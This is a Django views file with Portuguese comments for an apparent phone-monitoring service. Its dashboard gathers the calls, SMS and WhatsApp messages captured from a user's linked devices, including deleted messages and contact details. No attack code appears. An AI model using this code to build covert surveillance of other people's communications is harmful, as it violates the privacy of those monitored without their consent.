"""
Views web para o app accounts
"""
from django.shortcuts import render, redirect
from django.contrib.auth.decorators import login_required
from django.contrib.auth import login, logout, authenticate
from django.contrib import messages
from django.db.models import Count, Sum, Q
from django.utils import timezone
from datetime import timedelta

from .models import User, UserProfile
from .forms import LoginForm, RegisterForm
from apps.devices.models import Device
from apps.calls.models import Call
from apps.sms_messages.models import SMSMessage
from apps.whatsapp.models import WhatsAppMessage


@login_required
def dashboard(request):
    """
    View principal do dashboard
    """
    user = request.user

    # Estatísticas dos dispositivos
    devices = Device.objects.filter(user=user)
    total_devices = devices.count()
    active_devices = devices.filter(status='active').count()

    # Estatísticas de ligações
    calls = Call.objects.filter(device__user=user)
    total_calls = calls.count()
    today_calls = calls.filter(call_date__date=timezone.now().date()).count()

    # Estatísticas de mensagens SMS
    messages = SMSMessage.objects.filter(device__user=user)
    total_messages = messages.count()
    total_sms = messages.filter(message_type='sms').count()

    # Estatísticas de WhatsApp
    whatsapp = WhatsAppMessage.objects.filter(device__user=user)
    total_whatsapp = whatsapp.count()
    deleted_whatsapp = whatsapp.filter(is_deleted=True).count()

    # Dados para gráficos (últimos 7 dias)
    last_7_days = timezone.now().date() - timedelta(days=7)

    # Datas para o gráfico
    dates = []
    call_counts = []
    message_counts = []
    whatsapp_counts = []

    for i in range(7):
        date = timezone.now().date() - timedelta(days=i)
        dates.append(date.strftime('%d/%m'))

        # Contagem do dia
        call_counts.append(calls.filter(call_date__date=date).count())
        message_counts.append(messages.filter(message_date__date=date).count())
        whatsapp_counts.append(whatsapp.filter(message_date__date=date).count())

    # Reverter para ordem cronológica
    dates.reverse()
    call_counts.reverse()
    message_counts.reverse()
    whatsapp_counts.reverse()

    # Atividade recente (combinar últimos 20 registros)
    recent_activities = []

    # Últimas ligações
    recent_calls = calls.order_by('-call_date')[:5]
    for call in recent_calls:
        recent_activities.append({
            'type': 'call',
            'contact': call.contact_name or call.phone_number,
            'phone_number': call.phone_number,
            'content': f"{call.duration} segundos",
            'time': call.call_date,
            'is_deleted': False
        })

    # Últimas mensagens SMS
    recent_msgs = messages.order_by('-message_date')[:5]
    for msg in recent_msgs:
        recent_activities.append({
            'type': 'sms',
            'contact': msg.contact_name or msg.phone_number,
            'phone_number': msg.phone_number,
            'content': msg.content[:50],
            'time': msg.message_date,
            'is_deleted': msg.is_deleted
        })

    # Últimas mensagens WhatsApp
    recent_whats = whatsapp.order_by('-message_date')[:5]
    for msg in recent_whats:
        recent_activities.append({
            'type': 'whatsapp',
            'contact': msg.contact_name or msg.phone_number,
            'phone_number': msg.phone_number,
            'content': msg.content[:50],
            'time': msg.message_date,
            'is_deleted': msg.is_deleted
        })

    # Ordenar por data (mais recente primeiro)
    recent_activities.sort(key=lambda x: x['time'], reverse=True)
    recent_activities = recent_activities[:10]  # Manter apenas os 10 mais recentes

    # Formatar tempo relativo
    for activity in recent_activities:
        time_diff = timezone.now() - activity['time']
        if time_diff.days > 0:
            activity['time'] = f"{time_diff.days} dia(s) atrás"
        elif time_diff.seconds < 3600:
            minutes = time_diff.seconds // 60
            activity['time'] = f"{minutes} min atrás" if minutes > 0 else "Agora mesmo"
        else:
            hours = time_diff.seconds // 3600
            activity['time'] = f"{hours} hora(s) atrás"

    context = {
        'total_devices': total_devices,
        'active_devices': active_devices,
        'total_calls': total_calls,
        'today_calls': today_calls,
        'total_messages': total_messages,
        'total_sms': total_sms,
        'total_whatsapp': total_whatsapp,
        'deleted_whatsapp': deleted_whatsapp,
        'activity_dates': dates,
        'call_counts': call_counts,
        'message_counts': message_counts,
        'whatsapp_counts': whatsapp_counts,
        'recent_activities': recent_activities,
    }

    return render(request, 'dashboard.html', context)


@login_required
def profile(request):
    """
    View do perfil do usuário
    """
    user = request.user

    if request.method == 'POST':
        # Atualizar perfil
        user.first_name = request.POST.get('first_name', user.first_name)
        user.last_name = request.POST.get('last_name', user.last_name)
        user.phone = request.POST.get('phone', user.phone)
        user.save()

        messages.success(request, 'Perfil atualizado com sucesso!')
        return redirect('profile')

    context = {
        'user': user,
    }

    return render(request, 'profile.html', context)


@login_required
def settings(request):
    """
    View de configurações
    """
    return render(request, 'settings.html')


def login_view(request):
    """
    View de login
    """
    if request.user.is_authenticated:
        return redirect('dashboard')

    if request.method == 'POST':
        form = LoginForm(request.POST)
        if form.is_valid():
            email = form.cleaned_data['email']
            password = form.cleaned_data['password']
            user = authenticate(email=email, password=password)

            if user:
                login(request, user)
                messages.success(request, f'Bem-vindo, {user.email}!')
                return redirect('dashboard')
            else:
                messages.error(request, 'Email ou senha inválidos.')
    else:
        form = LoginForm()

    return render(request, 'login.html', {'form': form})


def register_view(request):
    """
    View de registro
    """
    if request.user.is_authenticated:
        return redirect('dashboard')

    if request.method == 'POST':
        form = RegisterForm(request.POST)
        if form.is_valid():
            user = form.save()

            # Criar perfil
            UserProfile.objects.create(
                user=user,
                role='user',
                max_devices=5
            )

            # Fazer login automático
            login(request, user)
            messages.success(request, 'Cadastro realizado com sucesso!')
            return redirect('dashboard')
        else:
            for error in form.errors.values():
                messages.error(request, error)
    else:
        form = RegisterForm()

    return render(request, 'register.html', {'form': form})


@login_required
def logout_view(request):
    """
    View de logout
    """
    logout(request)
    messages.info(request, 'Você saiu do sistema.')
    return redirect('login')